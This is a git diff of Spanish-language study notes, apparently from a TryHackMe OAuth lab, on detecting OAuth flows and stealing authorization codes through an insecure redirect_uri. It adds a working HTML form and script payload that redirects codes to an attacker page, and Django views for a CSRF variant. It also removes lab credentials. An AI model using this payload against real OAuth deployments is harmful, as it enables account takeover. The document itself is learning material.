@@ -92,10 +92,87 @@ Usado pde servidor a servidor interactua. El cliente usa sus credenciales para a
 
 ![image](https://github.com/user-attachments/assets/177f2a8f-9cda-42c5-b249-3eceb86e8b0d)
 
-# Prática 
+# Identificar Servicios OAuth
 
-Victim: victim:victim123
-Attacker: attacker:tesla@123
+## Detectar implementaciones OAuth
+
+Cuando analizamos el trafico de la red durante el proceso de logeo, tenemos que poner atención a la redirecciones  HTTP. Estas implementaciones pueden generar directamente autorizaciones de URLK. SI la URL contiene consultas especificas como 
+
+- response_type
+- client_id
+- redirect_uri
+- scope
+- state
+
+```
+https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123
+```
+
+## Identificar el framework de OAuth
+
+Una vez confirmado que se usa OAuth, es ver el framework o libreria de la alpicacion de empleados. Esto nos dara información y vulnerabilidades psoibles.
+
+- HTTP Headers y respuesta
+- Codigo
+- Autorizacion y finalizaciones de endpoints
+- Mensajes de error
+
+# Explotar OAuth - Robar TOken
+
+## Redirección ROL
+
+el Parametro "redirect_uri" especifica durante el flow direct cuando el servidor autoriza y manda el toquen. 
+
+## Vulnerabilidad
+
+Un inseguro redirect, si el atacante gana el control e un dominio y lista la URI, puede manipular la interceptación de tokens
+
+![image](https://github.com/user-attachments/assets/f0e96fca-86d3-49dc-b5a6-617298d20c8c)
+
+## Preparar Payload
+
+```
+ <form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
+            <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
+            <input type="submit" value="Hijack OAuth">
+        </form>
+```
+
+```
+<script>
+            // Extract the authorization code from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            document.getElementById('auth_code').innerText = code;
+            console.log("Intercepted Authorization Code:", code);
+            // code to save the acquired code in database/file etc
+        </script>
+```
+
+## Explotar OaUTH
+
+```
+def oauth_logincsrf(request):
+    app = Application.objects.get(name="ContactApp")
+    redirect_uri = request.POST.get("redirect_uri", "http://coffee.thm/csrf/callbackcsrf.php") 
+    
+    authorization_url = (
+        f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
+    )
+    return redirect(authorization_url)
+
+def oauth_callbackflagcsrf(request):
+    code = request.GET.get("code")
+    
+    if not code:
+        return JsonResponse({'error': 'missing_code', 'details': 'Missing code parameter.'}, status=400) 
+
+    if code:
+        return JsonResponse({'code': code, 'Payload': 'http://coffee.thm/csrf/callbackcsrf.php?code='+code}, status=400)
+```
+
+
+
 
 
 
